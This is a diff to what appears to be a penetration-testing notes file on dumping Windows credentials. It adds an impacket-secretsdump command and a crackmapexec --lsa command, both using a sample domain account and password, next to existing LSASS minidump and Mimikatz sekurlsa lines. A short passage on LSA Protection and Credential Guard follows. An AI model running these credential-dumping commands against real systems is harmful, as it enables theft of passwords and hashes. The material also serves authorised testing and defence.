@@ -113,6 +113,14 @@ C:\minidump.exe c:\windows\tasks\lsass.dmp
 2. PS C:\> Invoke-Mimikatz -Command "`"sekurlsa::minidump c:\tools\lsass.dmp`"sekurlsa::logonpasswords"
 ```
 
+4th method(using [impacket-secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) and crackmapexec)
+
+```
+~# impacket-secretsdump contoso.com/trike:'DeVT$st43'@192.168.1.1
+
+~# crackmapexec smb 192.168.1.1 -u trike -p 'DeVT$st43' -d contoso.com --lsa
+```
+
 When the popularity of cached credential retrieving raised, Microsoft introduced 2 secuirty measures: LSA Protection and Windows Defender Credential Guard. The LSA protection added an additional process 
 security layer, the Process Protected Light(PPL), which is placed on top of the highest integrity level. This means that SYSTEM level privileges aren't enough to dump the LSASS.
 
